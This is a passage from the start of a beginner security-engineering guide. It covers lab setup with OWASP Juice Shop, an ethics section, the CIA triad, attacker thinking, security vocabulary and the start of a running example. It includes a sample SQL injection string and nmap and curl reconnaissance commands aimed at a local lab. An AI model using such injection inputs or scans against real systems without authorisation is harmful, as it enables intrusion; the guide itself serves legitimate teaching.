# Security from Zero — A Practical Guide for Engineers

> 📖 **Read this on [frontendlabs.xyz](https://frontendlabs.xyz/security-from-zero/)**: the official edition, with one page per chapter, search, and dark mode. <!-- frontendlabs-notice -->

> From "what is Base64?" to running your own certificate authority, migrating to
> post-quantum cryptography, and breaking (then fixing) a real application.
>
> **You do not need any security background to start.** You need a terminal, a
> willingness to run commands, and about 40 hours. Everything else is explained
> the first time it appears.

---

> **The series:** 1 OS → 2 Networking → 3 Security → 4 HTTPS walkthrough, with Go alongside.
>
> **You are here: step 3a, Security: foundations.** ← Previous: [Networking from Zero (TCP/IP)](../networking/tcp-ip/real-life-guide-v1.md). Next: [Security Engineering in Depth](real-life-security-guide-v1.md) →
>
> [The full series map](#0-8-the-series-os-networking-security-https).

---

## What you will be able to do at the end

1. Explain the difference between **encoding, hashing, and encryption** — and
   never confuse them again.
2. Choose the right algorithm for a job in 2026, and say *why* the alternatives
   are wrong.
3. Use **OpenSSL** confidently: keys, certificates, signatures, encryption,
   debugging TLS.
4. Explain a **TLS handshake** packet by packet, and configure a server properly.
5. **Run your own certificate authority** and issue working certificates.
6. Harden **SSH**, and know exactly which settings matter.
7. Find and fix the **OWASP Top 10** classes of web vulnerability in real code.
8. Explain **post-quantum cryptography**, why it matters now, and audit a system
   for readiness.
9. Think like an attacker: threat model a system and find where it breaks.

---

## Contents

**Part 0 — Start here** *(read this first)*
- 0.1 Who this is for · 0.2 **The learning flow** · 0.3 The roadmap ·
  0.4 Build your lab · 0.5 The little bit of maths you need ·
  0.6 **Ethics and the law** · 0.7 How not to get stuck ·
  0.8 **The series: OS → networking → security → HTTPS**

**Part 1 — Foundations**
1. What "security" actually means
2. Thinking like an attacker
3. The vocabulary that trips everyone up
4. Our running example: the SecureShop application

**Part 2 — Encoding: the thing that is *not* security**
5. How text becomes bytes
6. **Base64, hex, and URL encoding — and why none of them protect anything**
7. Unicode, normalisation, and the bugs they cause

**Part 3 — Hashing: fingerprints for data**
8. What a hash function is
9. The real hash functions, and which ones are broken
10. **Password storage is a completely different problem**
11. HMAC: proving a message wasn't tampered with

**Part 4 — Symmetric encryption**
12. The idea, and what "perfect secrecy" costs
13. Block ciphers and AES
14. **Modes of operation (and why ECB is a meme)**
15. AEAD: encryption and authentication together
16. Hands-on: symmetric encryption with OpenSSL

**Part 5 — Asymmetric (public-key) cryptography**
17. The key distribution problem
18. Diffie–Hellman: agreeing a secret in public
19. RSA, from first principles
20. Elliptic curves: same security, smaller keys
21. Digital signatures
22. Hands-on: keys, signing, and verifying with OpenSSL

**Part 6 — Post-quantum cryptography**
23. Why a quantum computer breaks today's crypto
24. **Harvest now, decrypt later**
25. The NIST standards: ML-KEM, ML-DSA, SLH-DSA, HQC
26. Hybrid mode, and how to actually migrate

**Part 7 — TLS and HTTPS**
27. What TLS gives you (and what it doesn't)
28. **The handshake, step by step**
29. Certificates and the PKI
30. Trust in practice: CT, revocation, ACME
31. Configuring TLS properly
32. **Project: run your own certificate authority**

**Part 8 — SSH**
33. How SSH works
34. Keys, agents, and config
35. Hardening SSH
36. Tunnels and port forwarding

**Part 9 — Network security**
37. Attacks on the network
38. Firewalls and segmentation
39. VPNs: IPsec and WireGuard
40. DDoS and rate limiting

**Part 10 — Web and HTTP security**
41. How the web decides what to trust (origins, SOP, cookies, CORS)
42. **Injection: when data becomes code**
43. Cross-site scripting (XSS)
44. Request forgery: CSRF, SSRF, clickjacking
45. **Broken access control**
46. Authentication, sessions, and federated identity (JWT, OAuth, OIDC)
47. **Supply chain and the code you didn't write**
48. Hands-on: testing a web application

**Part 11 — Operating securely**
49. **Secrets management**
50. Logging, detection, and monitoring
51. Incident response
52. Threat modeling and secure design

**Part 12 — Projects**
53. **Project 1: your own CA, plus mutual TLS**
54. **Project 2: harden a server end to end**
55. **Project 3: break and fix a vulnerable application**
56. **Project 4: a post-quantum readiness audit**

**Part 13 — Where to go next**
57. Honest gaps, and a six-month plan
58. Specialisations, certifications, and staying current

**Appendices**
- A. Glossary (plain language)
- B. **The OpenSSL cookbook**
- C. Command cheat sheet
- D. **What to use in 2026 (algorithm reference)**
- E. Reading list and how the facts here were checked
- F. Answers to "Check yourself"

---

# Part 0 — Start here

## 0.1 Who this guide is for

| You are… | Works for you? |
|---|---|
| A developer who has never studied security | **Yes** — this is the primary reader |
| A sysadmin/SRE who configures TLS and SSH by copying snippets | **Yes** — you'll finally know *why* |
| Someone moving into a security engineering role | **Yes** — this is the ground floor and several storeys up |
| A student preparing for Security+/CEH/OSCP foundations | Yes, as the "why" behind the syllabus |
| A cryptographer | No — this is applied, not theoretical. See Appendix E. |

**Assumed:** you can open a terminal, run commands, and read code loosely
(Python and shell). You know what a file, a process, and a web request are.

**Not assumed:** any cryptography, any maths beyond arithmetic, any security
vocabulary. Every term is defined on first use.

---

## 0.2 The learning flow

Reading about security produces people who can *talk* about security. Doing the
exercises produces people who can *do* it. Every chapter is built for this loop.

```
   +--------------------------------------------------------------------+
   |                                                                    |
   |  1. READ        2. EXPLAIN      3. DO IT        4. BREAK IT        |
   |  (15 min)       (5 min)         (20-40 min)     (10 min)           |
   |                                                                    |
   |  Read the  -->  Close the  -->  Run the    -->  Change something   |
   |  chapter        guide and       commands        so it FAILS, and   |
   |  once.          say it in       yourself.       watch how.         |
   |                 your own                                           |
   |                 words.              |                |             |
   |                      |              |                |             |
   |            can't? re-read           +-------+--------+             |
   |                                             |                      |
   |                                             v                      |
   |  5. CHECK: answer the questions from memory.                       |
   |  6. WRITE: one line in notes.md --                                 |
   |     "X protects against Y, and fails when Z."                      |
   |                                                                    |
   +--------------------------------------------------------------------+
                                  |
                                  v
                every ~6 chapters: ATTACK something you built
```

### Why step 4 matters more here than in any other subject

In most engineering, you learn by making things work. **In security you learn by
making things fail.** A TLS config you've never seen reject a bad certificate is
a TLS config you don't understand. Every chapter has a "break it" exercise for
exactly this reason.

### The rules

1. **Time-box confusion to 20 minutes.** Note the question, mark it `TODO`, move
   on. Cryptography especially tends to click two chapters later.
2. **Never skip the hands-on sections.** Reading about AES-GCM teaches you
   nothing; encrypting a file and then corrupting one byte teaches you everything.
3. **Type the commands.** Do not copy-paste. Typos teach you the syntax.
4. **Keep `notes.md`** with: one-line summaries, every command that surprised
   you, and every error you hit plus its fix.
5. **One pass, then depth.** Get through the whole guide once before going deep.

---

## 0.3 The roadmap

Three routes. Same chapters.

### Route A — "I want to understand security" (3 weeks, ~1 h/day)

| Days | Read | You'll be able to |
|---|---|---|
| 1–2 | Part 0–1 | Threat model, and use the vocabulary correctly |
| 3 | Part 2 (Ch 5–7) | Never confuse encoding with encryption again |
| 4–5 | Part 3 (Ch 8–11) | Hash properly; store passwords properly |
| 6–8 | Part 4 (Ch 12–16) | Symmetric crypto and AEAD |
| 9–11 | Part 5 (Ch 17–22) | Public keys, signatures, OpenSSL |
| 12 | Part 6 (Ch 23–26) | Post-quantum, and what to do about it |
| 13–15 | Part 7 (Ch 27–32) | **TLS end to end, and your own CA** |
| 16 | Part 8 (Ch 33–36) | SSH properly |
| 17–18 | Part 9 (Ch 37–40) | Network attacks and defences |
| 19–21 | Part 10 (Ch 41–48) | **Web security / OWASP Top 10** |

### Route B — "I need this for my job now" (6 weeks, ~1–2 h/day)

Weeks 1–3: Route A, doing **every** hands-on and break-it exercise.
Week 4: Part 10 in depth + **Project 3** (break and fix a vulnerable app).
Week 5: **Projects 1 and 2** (your own CA; harden a server).
Week 6: Part 11 (operations) + **Project 4** (PQC audit) + threat model your own
production system.

### Route C — "I want to be a security engineer" (12 weeks, ~2 h/day)

| Week | Focus | Deliverable |
|---|---|---|
| 1 | Part 0–1, lab built | A working lab; a threat model of one real system |
| 2 | Part 2–3 | A password-storage implementation you can defend |
| 3–4 | Part 4–5 | Every OpenSSL exercise; a written explainer of RSA vs ECC |
| 5 | Part 6 | **Project 4**: PQC audit of a real service |
| 6–7 | Part 7 | **Project 1**: CA + mTLS between two services |
| 8 | Part 8–9 | **Project 2**: a hardened, scanned, documented server |
| 9–10 | Part 10 | **Project 3**: full write-up of 10 vulnerabilities found and fixed |
| 11 | Part 11 | An incident-response runbook and a detection rule set |
| 12 | Consolidate | Publish a technical write-up; start a CTF habit |

---

## 0.4 Build your lab (30 minutes)

You need somewhere you are **allowed** to attack. That is the whole point of a
lab.

### Step 1 — Core tools

**macOS:**
```bash
# Homebrew first: https://brew.sh
brew install openssl@3 nmap wireshark jq wget gnupg
brew install --cask docker
# macOS ships LibreSSL as `openssl`. You want real OpenSSL 3.x:
echo 'export PATH="/opt/homebrew/opt/openssl@3/bin:$PATH"' >> ~/.zshrc
exec zsh
```

**Linux (Debian/Ubuntu):**
```bash
sudo apt update
sudo apt install -y openssl nmap tcpdump wireshark curl jq gnupg \
                    build-essential python3-pip docker.io git
sudo usermod -aG docker $USER   # log out and back in
```

**Windows:** use **WSL2** with Ubuntu, then follow the Linux instructions.

### Step 2 — Verify

```bash
openssl version            # want OpenSSL 3.x  (NOT LibreSSL)
nmap --version
docker --version
python3 --version
```

> **If `openssl version` says LibreSSL, stop and fix it.** macOS's built-in
> version lacks features used throughout this guide. The `PATH` line above fixes
> it.

### Step 3 — A safe target to attack

**OWASP Juice Shop** — a deliberately vulnerable web application, built for
exactly this:

```bash
docker run --rm -d -p 3000:3000 --name juice bkimminich/juice-shop
# open http://localhost:3000
# stop it later with:  docker stop juice
```

This runs **on your machine only**. You own it. You may attack it freely.

### Step 4 — A scratch directory

```bash
mkdir -p ~/sec-lab/{ca,keys,certs,scratch} && cd ~/sec-lab
echo "sec-lab" > notes.md
```

Everything in this guide happens in `~/sec-lab`.

---

## 0.5 The little bit of maths you need

Four ideas. Nothing more. Each is re-explained where used.

### Idea 1 — Bits, bytes, and "key size"

A **bit** is 0 or 1. A **byte** is 8 bits (values 0–255).

A **128-bit key** is 128 bits of secret — `2^128` possible values, which is
about `3.4 × 10^38`. That number is the entire reason symmetric crypto works:

```
   2^128 = 340,282,366,920,938,463,463,374,607,431,768,211,456

   A machine trying 1,000,000,000,000 (10^12) keys per second
   would need about 10^19 years to try them all.
   The universe is about 1.4 x 10^10 years old.
```

**Brute force is not a threat to a 128-bit key.** Every real attack works around
the key, not through it. Remember that; it reframes everything.

### Idea 2 — XOR

Exclusive-or. The one operation you must know.

```
   0 XOR 0 = 0        Rule: output 1 when the inputs DIFFER.
   0 XOR 1 = 1
   1 XOR 0 = 1
   1 XOR 1 = 0

   The magic property:   (A XOR B) XOR B = A

   plaintext  0110 1001
   key        1010 1100   XOR
              ---------
   ciphertext 1100 0101

   ciphertext 1100 0101
   key        1010 1100   XOR
              ---------
   plaintext  0110 1001    <-- back to the original
```

XOR with a key encrypts; XOR with the same key decrypts. That's the core of every
stream cipher.

### Idea 3 — Modular arithmetic ("clock arithmetic")

```
   On a 12-hour clock:  9 + 5 = 2       because 14 mod 12 = 2

   "mod n" means: divide by n, keep the remainder.
      17 mod 5 = 2        100 mod 7 = 2        6 mod 6 = 0
```

Public-key crypto works in enormous clocks — numbers hundreds of digits long.
That's the only reason it's hard to reverse.

### Idea 4 — One-way functions

A function that's easy forwards and impractical backwards.

```
   EASY:   multiply 1,048,573 x 1,048,583  = 1,099,483,725,059
   HARD:   given 1,099,483,725,059, find the two factors

   With 300-digit numbers, "hard" means "no known method finishes
   before the sun burns out".
```

**All of cryptography is built on one-way functions.** Hashing is one-way.
RSA relies on factoring being one-way. Diffie–Hellman relies on discrete
logarithms being one-way.

### That's genuinely all

If those four made sense, you can read every chapter here. Where deeper maths
appears it's marked **optional** and you can skip it.

### Further reading (only if you want more)

- **Book:** *Serious Cryptography* (2nd ed.) — Jean-Philippe Aumasson. The best
  bridge between "I know nothing" and real understanding. Almost no maths
  prerequisites.
- **Video:** Computerphile's cryptography playlist — short, visual, excellent.
- **Interactive:** `cryptohack.org` — free, gamified, teaches by doing.

---

## 0.6 Ethics and the law — read this before Part 2

This is the only part of this guide with legal consequences.

```
   +----------------------------------------------------------------+
   |  ATTACK ONLY:                                                   |
   |    * systems you personally own                                 |
   |    * the lab you built in 0.4                                   |
   |    * deliberately vulnerable targets (Juice Shop, HackTheBox,   |
   |      TryHackMe, PortSwigger Academy, CTFs)                      |
   |    * systems you have WRITTEN permission to test                |
   |                                                                 |
   |  NEVER:                                                         |
   |    * scan, probe, or test a system you don't own                |
   |    * "just check if it's vulnerable" on a live site              |
   |    * test your employer's systems without written authorisation |
   |      from someone empowered to give it                           |
   +----------------------------------------------------------------+
```

**Why this matters practically:** unauthorised access is a criminal offence in
most jurisdictions (the Computer Misuse Act in the UK, the CFAA in the US, and
equivalents elsewhere). **Good intentions are not a defence.** Neither is "I
didn't change anything." Port scanning a third party can itself be an offence in
some places.

**If you find a vulnerability by accident:** stop, don't dig further, and report
it through the organisation's security contact (look for `/.well-known/security.txt`
or a bug-bounty page). Document what you did, exactly.

**At work:** get authorisation in writing, with scope and dates, before you test
anything. Every professional does this. It protects you as much as them.

---

## 0.7 How not to get stuck

| Situation | Do this |
|---|---|
| "I don't follow the maths" | Skip it. It's marked optional for a reason. The *properties* matter, not the proofs. |
| "OpenSSL gave a cryptic error" | Add `-text` or use `openssl errstr <code>`. Appendix B has the common ones. |
| "Which algorithm should I use?" | Appendix D is a decision table. Use it. Don't agonise. |
| "This feels overwhelming" | You're meeting 30 years of accumulated attacks at once. Everyone feels this. One chapter a day. |
| "I understand but can't explain it" | You don't understand it yet. Re-read only "How it works", then try again. |
| "Should I memorise algorithm internals?" | No. Memorise *what each one gives you* and *when it fails*. |
| "Too many acronyms" | Appendix A is a plain-language glossary. Bookmark it now. |

### Honesty markers used in this guide

> **Simplified:** the real story has more detail; here's the direction it goes.

> **Debated:** practitioners genuinely disagree; here are the positions.

> **Dangerous:** a common practice that looks fine and is not.

Facts, standards, and version numbers were checked against primary sources —
see Appendix E.

---

## 0.8 The series: OS → networking → security → HTTPS

This guide is one of seven, designed to be read as **one course** in this order:

```
   1  OS & Linux  ──▶  2  Networking  ──▶  3  Security  ──▶  4  HTTPS walkthrough
                         2a OSI map          3a From Zero        (one request through
                         2b TCP/IP           3b In Depth          every guide, in Go)
   ════════════════════  Go, alongside every step  ════════════════════
```

| Step | Guide | What it gives you | Hands-on |
|---|---|---|---|
| 1 | [Operating Systems, Linux, and Containers](../os-linux/real-life-os-guide.md) | the machine every request starts and ends on: processes, memory, files, sockets, containers, Kubernetes | 9 Go labs ([Part 20](../os-linux/real-life-os-guide.md#part-20-systems-programming-in-go-the-os-from-inside-a-program)) |
| 2a | [The OSI Model, One Click at a Time](../networking/real-life-example-osi.md) | one click followed through all seven layers; the map for everything after it | concept map, 1 hour |
| 2b | [Networking from Zero (TCP/IP)](../networking/tcp-ip/real-life-guide-v1.md) | how machines talk: addressing, routing, TCP, TLS, packet capture, network operations | 23 Go labs ([§0.8](../networking/tcp-ip/real-life-guide-v1.md#0-8-the-go-labs-build-the-network-tools-yourself)) |
| 3a | **Security from Zero** ← you are here | encoding vs hashing vs encryption, TLS, PKI, SSH, the OWASP Top 10, threat modelling | OpenSSL labs and a vulnerable app to break |
| 3b | [Security Engineering in Depth](real-life-security-guide-v1.md) | cloud and Kubernetes security, distributed authorization, advanced web attacks, data protection, detection | 10 Go labs + a `govulncheck` exercise ([§0.8](real-life-security-guide-v1.md#0-8-the-go-labs-security-mechanisms-you-can-run)) |
| 4 | [The HTTPS Request Lifecycle](../v2-https/real-life-guide-v1.md) | one request end to end, then the server side built in Go; Chapter 25 traces one request through every guide | 13 Go labs ([§0.6](../v2-https/real-life-guide-v1.md#0-6-the-go-labs-build-the-lifecycle-yourself), [Ch 25](../v2-https/real-life-guide-v1.md#chapter-25-one-https-request-every-layer-every-guide)) |
| ∥ | [Go — The Complete Field Guide](../Golang/real-life-golang-guide.md) | the language behind every lab, plus the 120-day plan's multi-week projects | [120-day plan](../Golang/golang-90-day-plan.md) |

**Why this order.** Every network connection is a file descriptor owned by
a process, so the OS comes first. Networking comes next, because every attack and
defence in the security guides assumes you can follow a packet. Security comes
third, because it needs both. The HTTPS walkthrough comes last because a
single HTTPS request uses all of it, and [its final chapter](../v2-https/real-life-guide-v1.md#chapter-25-one-https-request-every-layer-every-guide)
runs one request through every guide in a Go program. Go runs alongside the
whole way: each guide's "Build it in Go" labs turn its chapters into code you
can run.

**Reading paths by role:**

- **Backend engineer:** 1 (Phases 1–2, Part 20) → 2a → 2b (Parts 1–7) → 3a (Parts 1–6) →
  4 (all, including Part 9) → 3b (Parts 5–6).
- **SRE / platform:** 1 (all) → 2a → 2b (all) → 3b (Parts 2–4, 8) → 4 (Parts 8–10).
- **Security engineer:** 1 (Phases 1, 3) → 2a → 2b (Parts 3–8) → 3a → 3b → 4 (Chapters 12, 19–22, 25).
- **Engineering manager:** 2a → 1 (Chapters 1–3, 44, 66, 72) → 3b (Part 9) →
  4 (Chapters 13, 18, 23, 25).

Chapters link to each other directly, with **"Across the series"** notes where
another guide covers a topic in more depth.


# Part 1 — Foundations

## Chapter 1 — What "security" actually means

### In one sentence

Security is keeping a system doing what it's supposed to do, for the people it's
supposed to serve, and nothing else — for anybody else.

### The problem

"Make it secure" is not a requirement. Secure against whom? Doing what? At what
cost? Without answering those, you buy expensive controls that stop nothing.

### The three properties (the CIA triad)

Almost every security requirement is one of these three:

```
   +-------------------+---------------------------------------------+
   | CONFIDENTIALITY   | Only the right people can READ it.           |
   |                   | Broken by: data breach, eavesdropping,       |
   |                   |            a misconfigured S3 bucket         |
   +-------------------+---------------------------------------------+
   | INTEGRITY         | Only the right people can CHANGE it, and    |
   |                   | you can TELL if it changed.                  |
   |                   | Broken by: tampering, a corrupted update,    |
   |                   |            a modified bank transfer           |
   +-------------------+---------------------------------------------+
   | AVAILABILITY      | The right people can actually USE it.        |
   |                   | Broken by: DDoS, ransomware, a deleted        |
   |                   |            database, an expired certificate   |
   +-------------------+---------------------------------------------+
```

Two more that matter in practice:

- **Authenticity** — the message really came from who it claims. (Often folded
  into integrity.)
- **Non-repudiation** — the sender can't later deny sending it. This is what
  digital signatures give you and MACs do not (Chapter 21).

### The trade-off nobody tells beginners

**Security always costs something**, and usually it costs availability or
usability.

```
   Perfect confidentiality:  turn the server off. Nobody can read it.
   Perfect availability:     no authentication. Everybody gets in.

   Every real system sits somewhere between, deliberately.
```

Examples you'll recognise:
- Requiring MFA reduces account takeover **and** locks out users who lose their
  phone.
- Short session timeouts reduce stolen-session risk **and** annoy everyone.
- Rate limiting stops brute force **and** breaks a legitimate bulk import.

**A security engineer's actual job is choosing these trade-offs deliberately**,
not maximising one axis.

### Defence in depth

No single control works. Assume each one fails and ask "what's next?"

```
   An attacker wants your customer database.

   Layer 1  network:      firewall blocks direct DB access from the internet
   Layer 2  application:  parameterised queries prevent SQL injection
   Layer 3  authn:        the app authenticates to the DB with a scoped account
   Layer 4  authz:        that account can read orders, not payment details
   Layer 5  data:         card numbers are encrypted at rest with a KMS key
   Layer 6  detection:    unusual query volume raises an alert
   Layer 7  response:     credentials rotate automatically on alert

   The attacker must beat ALL of them. You must not lose ALL of them.
```

This is why "we have a firewall" is not a security posture.

### Real-world example: the 2017 credit-bureau breach

A single unpatched web framework vulnerability exposed ~147 million people's
data. The failures were layered, and every layer is one you can control:

1. A known vulnerability went unpatched for months (**patching**).
2. Network segmentation was poor, so one web server reached many databases
   (**segmentation**).
3. Data was not encrypted in a way that helped (**data protection**).
4. An expired certificate on a monitoring device meant traffic inspection was
   blind for 19 months (**availability of a control**).
5. Exfiltration ran undetected for 76 days (**detection**).

**The lesson isn't "patch faster."** It's that the breach required *five*
independent failures — and they had five independent chances to stop it.

### Practice (15 min, no code)

Pick a system you know (your company's app, your home network, your bank's
website). In `notes.md` write:

1. What would an attacker want from it? (Money? Data? Disruption? Reputation?)
2. For each of C, I, A — what would "broken" look like *specifically*?
3. Name three layers of defence that exist today.
4. Which single failure would be worst, and what's the layer beneath it?

Keep this. You'll refine it in Chapter 52.

### Common confusions

- **"Security is a feature you add."** It's a property of the whole system. You
  can't bolt it on at the end any more than you can bolt on "fast".
- **"We're too small to be a target."** Most attacks are automated and
  indiscriminate. Your server was port-scanned several times while you read this
  chapter.
- **"Compliance means secure."** Compliance is a floor, often an outdated one.
  Plenty of breached companies were compliant.

### Check yourself

1. Name the three properties of the CIA triad, and one way each breaks.
2. What does security usually cost, and give an example.
3. What does "defence in depth" mean?
4. Why is "we have a firewall" an insufficient answer?

*(Answers: Appendix F.)*

### Further reading

- **Book:** *Security Engineering* (3rd ed.) — Ross Anderson. **Free online.**
  The definitive book on the field, and unusually readable. Chapter 1 is a
  perfect companion to this chapter.
- **Article:** NIST's definition of the CIA triad in FIPS 199 — short and
  authoritative.
- **Video:** Professor Messer's Security+ series, "CIA Triad" — free, ~8 min.

---

## Chapter 2 — Thinking like an attacker

### In one sentence

Attackers don't break your design; they find the places you never considered part
of your design.

### The idea

Developers think about the **happy path**. Attackers think about everything else.

```
   DEVELOPER: "The user enters their email and we send a reset link."

   ATTACKER:  What if the email is 10 MB long?
              What if it's someone else's email?
              What if it contains SQL? Or a script tag? Or a newline
                that injects an extra SMTP header?
              What if I request 10,000 resets a second?
              Is the reset token random? How long is it valid?
              Can I use it twice? Does it work after a password change?
              What does the response tell me about whether the account exists?
              Is the link sent over HTTPS? Does it leak in the Referer header?
```

Same feature. Ten attacks. **The discipline is asking those questions
systematically instead of hoping you thought of them.**

### Attack surface

Everything an attacker can reach and interact with.

```
   Your application's attack surface includes:

   ENTRY POINTS       every URL, API endpoint, form field, header, cookie,
                      file upload, webhook, queue message, CLI argument,
                      environment variable, config file
   DEPENDENCIES       every library, container image, base OS package,
                      CI/CD action, browser extension in your pipeline
   INFRASTRUCTURE     open ports, cloud metadata endpoints, admin panels,
                      backup buckets, DNS records, forgotten subdomains
   PEOPLE             support staff who can reset passwords, anyone who
                      can be phished, contractors, ex-employees
   PHYSICAL           laptops, USB ports, the office door
```

**Reducing attack surface is the cheapest security work available.** A deleted
endpoint has no vulnerabilities. An uninstalled package can't be exploited.

### Trust boundaries

The single most useful concept in this chapter. **A trust boundary is any point
where data crosses from a place you control to one you don't** (or vice versa).

```
   INTERNET  --------->|  your load balancer   ------> your app -----> your DB
             boundary 1|              boundary 2|            boundary 3|

   At EVERY boundary you must ask:
      * Do I know who this is?           (authentication)
      * Are they allowed to do this?     (authorization)
      * Is this data shaped as expected?  (validation)
      * What happens if it's hostile?    (the actual question)
```

**Validation happens at boundaries.** The classic mistake is validating in the
browser (inside the attacker's control) and trusting it on the server.

> **Rule to memorise: anything that crosses a trust boundary toward you is
> untrusted, no matter who sent it.** Including your own frontend. Including
> another microservice. Including a "trusted" partner's webhook.

### The attacker's process

Real attacks follow a predictable shape (this is the "kill chain"):

```
   1. RECON        find out what exists: subdomains, ports, versions,
                   employees on LinkedIn, leaked credentials
   2. INITIAL      get a foothold: phishing, an exposed service,
      ACCESS       a known CVE, stolen credentials
   3. EXECUTION    run code
   4. PERSISTENCE  survive a reboot or a password change
   5. PRIVILEGE    become root / admin / a service account
      ESCALATION
   6. LATERAL      move to more valuable systems
      MOVEMENT
   7. COLLECTION   find and stage the data
   8. EXFILTRATION get it out
   9. IMPACT       ransomware, destruction, fraud
```

**Defensive value:** you can break the chain at *any* link. Most organisations
obsess over step 2 and ignore 4–8, which is where they'd actually detect a real
intrusion. This model is formalised in **MITRE ATT&CK** (Chapter 49) — a free,
extremely detailed catalogue of real techniques.

### Practice (25 min)

**A. Enumerate an attack surface.** For the Juice Shop instance from §0.4:

```bash
docker start juice 2>/dev/null || docker run --rm -d -p 3000:3000 --name juice bkimminich/juice-shop
sleep 15

# What's listening?
nmap -sV -p 3000 localhost

# What does the app tell us about itself?
curl -sI http://localhost:3000 | head -20
curl -s http://localhost:3000 | grep -oE 'src="[^"]+"' | head -20
```

**B. Find the trust boundaries** in the Juice Shop login flow. Open the browser's
DevTools → Network, log in with anything, and list:
1. What data crosses from browser to server?
2. What validation *could* be client-side only?
3. What does the error message reveal?

**C. Think it through.** For your own project (or one you know), write down five
entry points you'd forgotten existed. Almost everyone finds at least one.

### Common confusions

- **"Attackers are geniuses."** Overwhelmingly they run automated tools against
  known vulnerabilities. The sophisticated ones exist but aren't your first
  problem.
- **"Our API is internal so it's safe."** Internal networks get breached; then
  every unauthenticated internal service is free. This is why "zero trust"
  exists.
- **"Obscurity helps."** A hidden endpoint is found by a scanner in minutes.
  Obscurity is fine as a *bonus layer*, never as *the* control.

### Check yourself

1. What is a trust boundary, and what must you do at one?
2. Give five things that are part of a web application's attack surface.
3. Why is reducing attack surface such good value?
4. Name three stages of the attack chain after initial access.

### Further reading

- **Framework:** MITRE ATT&CK (`attack.mitre.org`) — the encyclopedia of real
  attacker techniques. Browse one tactic column; it's eye-opening.
- **Book:** *The Web Application Hacker's Handbook* — Stuttard & Pinto. Dated in
  places, still the best mental model for attacking web apps.
- **Practice:** PortSwigger Web Security Academy (`portswigger.net/web-security`)
  — free, superb, hands-on labs. Start it now and work through it alongside
  Part 10.

---

## Chapter 3 — The vocabulary that trips everyone up

### In one sentence

Half of security confusion is people using the same word for different things —
so here are the distinctions that actually matter.

### Encoding vs Encryption vs Hashing

**This is the single most important distinction in the guide.** Part 2 and Part 3
exist to hammer it home.

```
   +-----------+------------------+-------------+---------------------------+
   |           | PURPOSE          | REVERSIBLE? | NEEDS A KEY?              |
   +-----------+------------------+-------------+---------------------------+
   | ENCODING  | make data safe   | YES, by     | NO -- anyone can reverse  |
   |           | to transport     | anyone      | it. NOT SECURITY.         |
   |           | (Base64, hex)    |             |                           |
   +-----------+------------------+-------------+---------------------------+
   | ENCRYPTION| keep data secret | YES, with   | YES                       |
   |           | (AES, RSA)       | the key     |                           |
   +-----------+------------------+-------------+---------------------------+
   | HASHING   | fingerprint data | NO, ever    | NO (or optional, for HMAC)|
   |           | (SHA-256)        |             |                           |
   +-----------+------------------+-------------+---------------------------+
```

> **Dangerous:** "We Base64 the password before storing it" is a sentence that
> appears in real production code. Base64 is not security. It is a costume.

### Authentication vs Authorization

```
   AUTHENTICATION (authn)  "Who are you?"        -> proving identity
                           password, key, MFA, certificate

   AUTHORIZATION  (authz)  "What may you do?"   -> checking permission
                           roles, ACLs, policies, ownership checks
```

You are authenticated *once*; you are authorized on *every single action*. The
most common serious web bug (OWASP #1, 22 years running) is doing the first and
forgetting the second.

```
   GET /api/orders/12345      <-- authenticated: yes, it's Alice
                                  authorized:    is order 12345 ALICE'S?
                                                  ^^^ this check is what's missing
```

### Threat vs Vulnerability vs Risk vs Exploit

```
   THREAT          something bad that could happen, and who'd do it
                   "a criminal group steals our customer data"

   VULNERABILITY   a weakness that would let it happen
                   "our search endpoint is vulnerable to SQL injection"

   EXPLOIT         the actual technique/code that abuses the vulnerability
                   "' OR 1=1 --"

   RISK            likelihood x impact -- what you actually prioritise on
                   "high: trivially exploitable, 2M records, GDPR fines"
```

You fix **vulnerabilities**, you defend against **threats**, you prioritise by
**risk**. A vulnerability with no plausible threat is low risk; ignore it until
the ones that matter are done.

### Some others worth pinning down

| Term | Means |
|---|---|
| **CVE** | A public ID for a specific vulnerability (`CVE-2021-44228` is Log4Shell) |
| **CVSS** | A 0–10 severity score for a CVE. **A starting point, not a priority** — it ignores your context. |
| **Zero-day** | A vulnerability with no patch available yet |
| **Payload** | The part of an exploit that does the attacker's actual work |
| **Defence in depth** | Multiple independent layers (Chapter 1) |
| **Least privilege** | Every user/process gets the minimum access needed |
| **Fail secure / fail closed** | On error, deny. (A lock that stays locked when power fails.) |
| **Fail safe / fail open** | On error, allow. (A fire door that unlocks.) — **choose deliberately** |
| **Salt** | Random data added before hashing, unique per record (Chapter 10) |
| **Nonce** | "Number used once" — must never repeat with the same key (Chapter 14) |
| **IV** | Initialisation vector — randomises encryption so identical plaintexts differ |
| **Entropy** | Genuine unpredictability. Measured in bits. |
| **PKI** | The whole system of certificates, CAs and trust (Chapter 29) |
| **MAC** | Message Authentication Code — proves integrity **and** authenticity with a shared key (Chapter 11) |

### The fail-open/fail-closed decision

This one catches people out, so it's worth pausing on:

```
   Your authorization service times out. What does the app do?

   FAIL CLOSED:  deny the request.
                 -> Safe. But if the service is flaky, your app is down.

   FAIL OPEN:    allow the request.
                 -> Available. But a DoS on your auth service becomes
                    a total authorization bypass.

   For AUTHORIZATION: fail closed, always.
   For a RECOMMENDATION ENGINE: fail open; show no recommendations.
```

**Decide this explicitly for every dependency.** The default in most code is
"whatever the exception handler happens to do", which is how outages become
breaches.

### Practice (10 min)

Classify each, in `notes.md`, as encoding / hashing / encryption / none:

1. `SGVsbG8gd29ybGQ=`
2. `5eb63bbbe01eeed093cb22bb8f5acdc3`
3. `%48%65%6C%6C%6F`
4. `$2b$12$KIXxPfnK6.wLd0LJgKmZLu...`
5. `U2FsdGVkX1+3xL2W...`
6. `-----BEGIN PUBLIC KEY-----`

Then, for one API you've built: is every endpoint doing an **authorization**
check, or only authentication?

*(Answers: Appendix F.)*

### Check yourself

1. State the three-way difference between encoding, encryption, and hashing.
2. What's the difference between authentication and authorization, and which is
   checked more often?
3. Define threat, vulnerability, and risk in one line each.
4. When should a system fail closed?

### Further reading

- **Glossary:** NIST's *Computer Security Resource Center* glossary
  (`csrc.nist.gov/glossary`) — the authoritative definitions when someone argues.
- **Book:** *Security Engineering* (Anderson), Chapter 1 — excellent on
  terminology and why it matters.

---

## Chapter 4 — Our running example: SecureShop

To keep this concrete, we'll secure the same system throughout the guide. Every
Part adds a layer.

### The system

```
                      +-------------------------------------------+
   customers  ------> |  shop.securesh.op        (web + API)       |
                      |    - browse products                       |
                      |    - log in / register                      |
                      |    - place orders, save card details        |
                      +---------------+---------------------------+
                                      |
                      +---------------v---------------------------+
                      |  orders-api    (internal service)          |
                      +---------------+---------------------------+
                                      |
